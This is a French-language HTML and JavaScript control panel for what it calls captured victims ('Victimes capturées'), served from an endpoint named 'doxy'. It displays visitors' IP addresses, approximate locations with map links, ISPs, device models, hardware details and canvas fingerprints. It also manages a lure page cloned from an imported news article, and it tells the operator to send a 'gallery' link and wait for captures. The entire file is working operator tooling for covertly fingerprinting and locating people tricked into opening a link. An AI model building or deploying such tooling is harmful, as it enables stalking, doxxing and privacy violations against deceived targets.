<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="robots" content="noindex, nofollow">
<title>Panel</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',Consolas,sans-serif}
body{background:#0e1116;color:#dce3ea;min-height:100vh}
#login{max-width:380px;margin:14vh auto;padding:28px;background:#161b24;border:1px solid #26303c;border-radius:14px}
#login h2{margin-bottom:4px;font-size:17px;color:#7fa2c7}
#login p{font-size:12px;color:#66788c;margin-bottom:18px}
#pass{width:100%;padding:11px 12px;background:#0b0e13;border:1px solid #2c3846;color:#dce3ea;border-radius:8px;font-size:15px;outline:none}
button{margin-top:12px;width:100%;padding:11px;background:#2b6cb0;color:#fff;border:0;border-radius:8px;font-size:14px;font-weight:600;cursor:pointer}
button:hover{background:#2f7cc9}
#lerr{color:#e07a7a;font-size:13px;margin-top:10px;min-height:16px}
#app{max-width:1180px;margin:0 auto;padding:18px}
header#bar{display:flex;align-items:center;justify-content:space-between;gap:12px;flex-wrap:wrap;margin-bottom:16px}
h1{font-size:19px;color:#7fa2c7}
.cnt{background:#1d2733;padding:4px 12px;border-radius:20px;font-size:13px;color:#9db4cc}
.tools{display:flex;gap:10px;align-items:center;flex-wrap:wrap}
#q{background:#0b0e13;border:1px solid #2c3846;color:#dce3ea;padding:9px 12px;border-radius:8px;width:230px;font-size:13px}
#flush{background:#a03c3c;padding:9px 14px;font-size:13px;width:auto;margin:0}
label.auto{font-size:12px;color:#7d92a8;display:flex;gap:6px;align-items:center}
table{width:100%;border-collapse:collapse;background:#12161d;border-radius:10px;overflow:hidden;font-size:13px}
th,td{padding:10px 12px;text-align:left;border-bottom:1px solid #1e2631;white-space:nowrap}
th{background:#1a212b;color:#7fa2c7;font-weight:600;font-size:12px;cursor:pointer}
tr.row{cursor:pointer}
tr.row:hover{background:#171d27}
tr.open{background:#1a2230}
td.badge{font-size:11px;padding:3px 9px;border-radius:10px}
.bg-ok{background:#1d3c2a;color:#7ed7a1}
.bg-no{background:#3c2530;color:#d99ba6}
#detail{background:#12161d;border:1px solid #243040;border-radius:12px;margin-top:14px;padding:20px;display:none}
#detail h3{color:#7fa2c7;font-size:15px;margin:16px 0 8px;border-bottom:1px solid #232e3b;padding-bottom:6px}
#detail h3:first-child{margin-top:0}
.kv{display:grid;grid-template-columns:repeat(auto-fill,minmax(230px,1fr));gap:8px}
.kv div{background:#0e1318;border:1px solid #1e2833;border-radius:8px;padding:8px 10px;font-size:12px}
.kv b{display:block;color:#5f7d9c;font-size:10px;letter-spacing:.6px;text-transform:uppercase;font-weight:600}
pre{background:#0a0d11;border:1px solid #1e2833;border-radius:8px;padding:12px;font-size:11px;overflow-x:auto;color:#93a8bd;max-height:260px;overflow-y:auto}
a.maps{color:#5ea9e6}
.empty{padding:40px;text-align:center;color:#5c7085}
.bait{background:#12161d;border:1px solid #243040;border-radius:12px;padding:14px 16px;margin-bottom:14px;display:flex;flex-wrap:wrap;align-items:center;justify-content:space-between;gap:10px}
.baitL{display:flex;flex-direction:column;gap:3px}
.baitL b{color:#7fa2c7;font-size:14px}
#baitState{font-size:12px;color:#8a9fb5}
.baitR{display:flex;align-items:center;gap:8px;flex-wrap:wrap}
.baitR button{margin:0;width:auto;padding:8px 12px;font-size:12px}
.ghost{background:#233041 !important}
#baitReset{background:#5c2f2f !important}
#baitHtml{width:100%;min-height:150px;background:#0b0e13;border:1px solid #2c3846;color:#dce3ea;border-radius:8px;padding:10px;font-family:Consolas,monospace;font-size:12px;resize:vertical}
#baitUrl{width:270px;background:#0b0e13;border:1px solid #2c3846;color:#dce3ea;border-radius:8px;padding:8px 10px;font-size:12px}
#baitMsg{width:100%;font-size:12px;min-height:14px;color:#8a9fb5}
@media(max-width:720px){th,td{padding:8px}#q{width:100%}}
</style>
</head>
<body>

<div id="login">
  <h2>Panel privé</h2>
  <p>Accès restreint. Session valable 8h.</p>
  <input id="pass" type="password" placeholder="Mot de passe" autofocus>
  <button onclick="doLogin()">Se connecter</button>
  <div id="lerr"></div>
</div>

<div id="app" style="display:none">
  <header id="bar">
    <div style="display:flex;gap:10px;align-items:center">
      <h1>Victimes capturées</h1>
      <span class="cnt" id="cnt">0</span>
    </div>
    <div class="tools">
      <input id="q" placeholder="Recherche IP / modèle..." oninput="render()">
      <button id="flush" onclick="flushAll()">Tout effacer</button>
      <label class="auto"><input type="checkbox" id="auto" checked onchange="startAuto()"> auto 30s</label>
    </div>
  </header>

  <div class="bait">
    <div class="baitL"><b>Leurre HTML</b><span id="baitState">—</span></div>
    <div class="baitR">
      <input id="baitUrl" placeholder="https://… article de presse">
      <button class="ghost" onclick="importUrl()">Importer l'URL</button>
      <button class="ghost" onclick="loadBait(true)">Recharger</button>
      <button onclick="saveBait()">Enregistrer</button>
      <button id="baitReset" onclick="resetBait()" style="display:none">Rétablir l'article d'origine</button>
    </div>
    <textarea id="baitHtml" placeholder="Colle ici le HTML de l'article, OU colle une URL puis clique « Importer l'URL » : le serveur extrait titre, image et texte, et reconstruit l'article dans le style du site."></textarea>
    <div id="baitMsg"></div>
  </div>

  <table id="tbl">
    <thead><tr>
      <th onclick="sort('ts')">Heure ▾</th>
      <th onclick="sort('ip')">IP</th>
      <th>Ville / Wilaya</th>
      <th>FAI</th>
      <th onclick="sort('dev')">Appareil</th>
      <th>Précision</th>
    </tr></thead>
    <tbody id="rows"></tbody>
  </table>
  <div id="empty" class="empty" style="display:none">Aucune capture. Envoie le lien galerie et attends.</div>

  <div id="detail"></div>
</div>

<script>
const DOXY='/api/v1/doxy', DATA='/api/v1/dataview', PAGE='/api/v1/page';
let list=[], opened=null, curSort='ts', asc=false, baitOn=false;

async function P(u,o){try{const r=await fetch(u,o);return r.ok&&r.status!==204?await r.json():null}catch(e){return null}}

async function doLogin(){
  const p=document.getElementById('pass').value;
  const j=await P(DOXY,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({p:p})});
  if(j){document.getElementById('login').style.display='none';document.getElementById('app').style.display='block';load();startAuto();loadBait()}
  else{document.getElementById('lerr').textContent='Accès refusé';}
}

async function load(){
  const j=await P(DATA);
  if(!j){document.getElementById('login').style.display='block';document.getElementById('app').style.display='none';return}
  list=j.sessions||[];
  document.getElementById('cnt').textContent=list.length;
  const has=list.length>0;
  document.getElementById('tbl').style.display=has?'table':'none';
  document.getElementById('empty').style.display=has?'none':'block';
  render();
}

function sort(k){if(curSort===k)asc=!asc;else{curSort=k;asc=false};render()}

function geoTxt(s){
  const g=s.geo||{};
  if(!g||g.err)return '—';
  const a=[g.city,g.region,g.country].filter(Boolean).join(' / ');
  return a||'—';
}
function ispTxt(s){const g=s.geo||{};return g.isp||g.org||'—'}
function devTxt(s){
  let m=s.hm||s.y;
  if(!m){
    const u=s.u||'';
    if(/iPhone/.test(u))m='iPhone';
    else if(/iPad/.test(u))m='iPad';
    else if(/Android/.test(u)){
      if(s.wv||s.app)m='Android (navigateur intégré)';
      else if(s.uh===0)m='Android (modèle masqué)';
      else m='Android (modèle inconnu)';
    }
    else if(/Windows/.test(u))m='PC Windows';
    else if(/Macintosh/.test(u))m='Mac';
    else if(/Linux/.test(u))m='Linux';
    else m=s.br||'—';
  }
  return m.length>34?m.slice(0,34)+'…':m;
}
function precS(s){
  const g=s.geo||{};
  if(g&&!g.err&&g.lat!==null&&g.lat!==undefined&&g.lat!=='')return '<span class="badge bg-ok">approx. IP</span>';
  if(g&&!g.err)return '<span class="badge bg-no">région IP</span>';
  return '<span class="badge bg-no">—</span>';
}
function fmtT(t){try{const d=new Date(t);return d.toLocaleDateString('fr-FR')+' '+d.toLocaleTimeString('fr-FR')}catch(e){return t||'—'}}

function render(){
  const q=document.getElementById('q').value.toLowerCase();
  let arr=list.filter(s=>JSON.stringify(s).toLowerCase().includes(q));
  arr.sort((a,b)=>{const x=curSort==='dev'?(devTxt(a)+'').toLowerCase():String(sel(a,curSort)||''),y=curSort==='dev'?(devTxt(b)+'').toLowerCase():String(sel(b,curSort)||'');return asc?x.localeCompare(y):y.localeCompare(x)});
  document.getElementById('rows').innerHTML=arr.map(s=>rowHtml(s,s.x===opened)).join('');
}
function sel(s,k){return k==='ts'?(s.ts||s.t):s[k]}

function rowHtml(s,open){
  return `<tr class="row ${open?'open':''}" onclick="toggle('${s.x}')">
    <td>${fmtT(s.ts||s.t)}</td>
    <td>${s.ip||'—'}</td>
    <td>${geoTxt(s)}</td>
    <td>${ispTxt(s)}</td>
    <td>${devTxt(s)}</td>
    <td>${precS(s)}</td>
  </tr>${open?detailHtml(s):''}`;
}

function toggle(x){opened=(opened===x)?null:x;render();
  if(opened){const d=document.getElementById('detail');if(d&&d.style.display==='block'){d.scrollIntoView({behavior:'smooth',block:'start'})}}
}

function fld(label,val){return `<div><b>${label}</b>${val===''||val===undefined||val===null?'—':val}</div>`}

function detailHtml(s){
  const g=s.geo||{};
  let maps='—';
  if(g.lat!=null&&g.lon!=null&&g.lat!==''&&g.lon!==''&&!g.err){
    maps=`<a class="maps" target="_blank" href="https://maps.google.com/?q=${g.lat},${g.lon}">${g.lat}, ${g.lon}</a>`;
  }
  const prec=(g.lat!=null&&!g.err&&g.lat!=='')?'approx. via IP (lat/lon)':'approx. via IP (ville/région)';
  return `<td colspan="6" style="white-space:normal"><div id="detail" style="display:block">
    <h3>Localisation (${prec})</h3>
    <div class="kv">
      ${fld('coords',maps)}
      ${fld('ville',g.city)}
      ${fld('region',g.region)}
      ${fld('pays',g.country)}
      ${fld('code postal',g.zip)}
      ${fld('fai',g.isp)}
      ${fld('org',g.org)}
      ${fld('asn',g.asn)}
    </div>
    <h3>Appareil</h3>
    <div class="kv">
      ${fld('modele (UA)',s.y)}
      ${fld('modele (hints)',s.hm)}
      ${fld('android (UA)',s.av)}
      ${fld('android (hints)',s.pv)}
      ${fld('os',s.os)}
      ${fld('app intégrée',s.app)}
      ${fld('webview',s.wv)}
      ${fld('UA-CH dispo',s.uh)}
      ${fld('arch',s.arch)}
      ${fld('bits',s.bits)}
      ${fld('mobile',s.mob)}
      ${fld('navigateurs (hints)',s.fv)}
      ${fld('navigateur',s.br)}
      ${fld('gpu',s.g)}
      ${fld('gpu vendor',s.n2)}
      ${fld('ram (GB)',s.m)}
      ${fld('cpu cores',s.c)}
      ${fld('ecran',s.s)}
      ${fld('viewport',s.v)}
      ${fld('pixel ratio',s.d)}
      ${fld('profondeur couleur',s.cd)}
      ${fld('touch points',s.t)}
      ${fld('batterie',s.bt)}
      ${fld('stockage (MB)',s.st)}
      ${fld('peripheriques media',s.q)}
    </div>
    <h3>Réseau & session</h3>
    <div class="kv">
      ${fld('connexion',s.k)}
      ${fld('downlink',s.dl)}
      ${fld('en ligne',s.n)}
      ${fld('timezone',s.z)}
      ${fld('offset',s.o)}
      ${fld('langue',s.l)}
      ${fld('langues',s.ls)}
      ${fld('referrer',s.r)}
      ${fld('plateforme',s.p)}
      ${fld('fingerprint canvas',s.f)}
    </div>
    <h3>User-agent complet</h3>
    <pre>${esc(s.u)}</pre>
    <h3>Enregistrement brut (JSON)</h3>
    <pre>${esc(JSON.stringify(s,null,2))}</pre>
  </div></td>`;
}
function esc(t){return String(t==null?'':t).replace(/[&<>]/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;'}[c]))}

async function flushAll(){
  if(!confirm('Effacer toutes les captures ?'))return;
  await P(DATA,{method:'POST',headers:{'Content-Type':'application/json'},body:'{"f":1}'});
  await load();
}

async function loadBait(showMsg){
  const msg=document.getElementById('baitMsg');
  if(showMsg){msg.style.color='#8a9fb5';msg.textContent='Chargement...'}
  try{
    const r=await fetch(PAGE,{cache:'no-store'});
    if(r.ok){document.getElementById('baitHtml').value=await r.text();baitOn=true}
    else{document.getElementById('baitHtml').value='';baitOn=false}
    baitRender();
    if(showMsg){msg.textContent=baitOn?'Leurre HTML chargé.':'Aucun leurre HTML — article d’origine.'}
  }catch(e){if(showMsg){msg.style.color='#e07a7a';msg.textContent='Erreur de chargement.'}}
}
function baitRender(){
  document.getElementById('baitState').textContent=baitOn?'Leurre HTML actif (remplace l’article)':'Aucun leurre HTML — article d’origine';
  document.getElementById('baitReset').style.display=baitOn?'inline-block':'none';
}
async function importUrl(){
  const u=document.getElementById('baitUrl').value.trim();
  const msg=document.getElementById('baitMsg'); msg.style.color='#8a9fb5';
  if(!/^https?:\/\//i.test(u)){msg.textContent='Colle une URL http(s) complète.';return}
  msg.textContent='Import en cours (5-10 s)...';
  const j=await P('/api/v1/fetch',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({u:u})});
  if(j&&j.h){
    document.getElementById('baitHtml').value=j.h;
    await saveBait(true);
  }else{
    msg.style.color='#e07a7a';
    msg.textContent=(j&&j.error)?j.error:'Import impossible (site bloqué ou page sans article).';
  }
}
async function saveBait(fromImport){
  const h=document.getElementById('baitHtml').value;
  const msg=document.getElementById('baitMsg');
  msg.style.color='#8a9fb5';
  if(!h.trim()){msg.textContent='Le HTML est vide.';return}
  if(/^https?:\/\//i.test(h.trim())&&h.indexOf('<')===-1){msg.style.color='#e07a7a';msg.textContent='Ceci est une URL : utilise « Importer l’URL ».';return}
  msg.textContent=fromImport?'Importé — activation...':'Enregistrement...';
  const j=await P(PAGE,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({h:h})});
  if(j&&j.ok){baitOn=true;baitRender();msg.style.color='#7ed7a1';msg.textContent=fromImport?'Importé et activé — recharge la page racine (Ctrl+F5).':'Leurre HTML enregistré — recharge la page racine (Ctrl+F5).'}
  else{msg.style.color='#e07a7a';msg.textContent='Échec : session expirée ou HTML trop gros (max 200 Ko).'}
}
async function resetBait(){
  if(!confirm('Rétablir l’article d’origine ?'))return;
  await P(PAGE,{method:'DELETE'});
  baitOn=false;baitRender();
  document.getElementById('baitHtml').value='';
  document.getElementById('baitMsg').style.color='#8a9fb5';
  document.getElementById('baitMsg').textContent='Article d’origine rétabli.';
}

let timer=null;
function startAuto(){
  if(timer)clearInterval(timer);
  if(document.getElementById('auto').checked){timer=setInterval(load,30000)}
}
document.getElementById('pass').addEventListener('keydown',e=>{if(e.key==='Enter')doLogin()});
</script>
</body>
</html>
